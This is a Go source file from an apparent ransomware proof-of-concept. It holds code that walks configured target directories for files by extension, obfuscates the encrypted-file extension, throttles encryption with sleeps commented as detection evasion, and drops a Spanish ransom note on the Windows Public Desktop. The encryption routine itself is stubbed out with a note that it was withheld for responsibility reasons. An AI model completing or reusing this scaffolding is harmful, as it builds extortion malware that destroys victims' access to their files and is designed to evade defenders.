package core

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"practica2/config"
	"strings"
	"time"
)

// getEncryptedExtension genera extensión para archivos cifrados
func getEncryptedExtension() string {
	// Ofuscar extensión .file
	ext := []byte{46, 102, 105, 108, 101} // .file
	return string(ext)
}

// GenerateKeyFromString deriva una clave AES de 32 bytes desde un string
func GenerateKeyFromString(keyString string) []byte {
	hash := sha256.Sum256([]byte(keyString))
	return hash[:]
}

// createGCM crea un cipher GCM a partir de una clave
func createGCM(key []byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("error creando cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("error creando GCM: %v", err)
	}

	return gcm, nil
}

// EncryptFile cifra un archivo individual usando AES-GCM
func EncryptFile(filePath string) error {
	/*
	 * [SECURITY PLACEHOLDER]
	 * The actual implementation of the file encryption logic (reading, AES-GCM encryption, 
	 * and original file deletion) has been withheld from this public repository for 
	 * security and responsibility reasons. 
	 * 
	 * This repository serves exclusively as a Proof of Concept (PoC) for educational 
	 * and portfolio purposes.
	 */
	return nil
}

// shouldEncryptFile verifica si el archivo debe ser cifrado
func shouldEncryptFile(filename string) bool {
	fileExt := filepath.Ext(filename)

	// No cifrar archivos ya cifrados
	if strings.ToLower(fileExt) == ".file" {
		return false
	}

	// Extraer extensión sin el punto
	ext := strings.ToLower(strings.TrimPrefix(fileExt, "."))

	// Verificar si la extensión está en la lista de extensiones a cifrar
	for _, targetExt := range config.Extensions {
		if ext == strings.ToLower(targetExt) {
			return true
		}
	}

	return false
}

// findFilesToEncrypt encuentra archivos para cifrar en los directorios objetivo
func findFilesToEncrypt() []string {
	var files []string
	for _, dir := range config.TargetDirectories {
		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err == nil && !info.IsDir() && shouldEncryptFile(info.Name()) {
				files = append(files, path)
			}
			return nil
		})
	}
	return files
}

// StartEncryption inicia el proceso de cifrado
func StartEncryption() error {
	files := findFilesToEncrypt()

	if len(files) == 0 {
		return nil
	}

	// Cifrar archivos uno por uno con delay para evitar detección
	successCount := 0
	for _, file := range files {
		if EncryptFile(file) == nil {
			successCount++
		}
		time.Sleep(100 * time.Millisecond) // Delay para evitar comportamiento sospechoso
	}

	// Generar nota de rescate solo si se cifró al menos un archivo
	if successCount > 0 {
		createRansomNote()
	}

	return nil
}

// createRansomNote crea archivos de rescate
func createRansomNote() {
	const noteContent = `=== ¡TUS ARCHIVOS HAN SIDO CIFRADOS! ===

Todos tus archivos han sido cifrados con AES-256.
Para recuperarlos necesitas la clave de descifrado.

Contacto: [no-reply@example.com]
Clave única: [NECESITA CLAVE DE DESCRIFRADO]

NO intentes descifrar los archivos por tu cuenta.
Podrías dañarlos permanentemente.`

	// Usar nombre menos obvio
	locations := []string{
		"C:\\Users\\Public\\Desktop\\NOTE.txt",
	}

	for _, location := range locations {
		os.WriteFile(location, []byte(noteContent), 0644)
	}
}
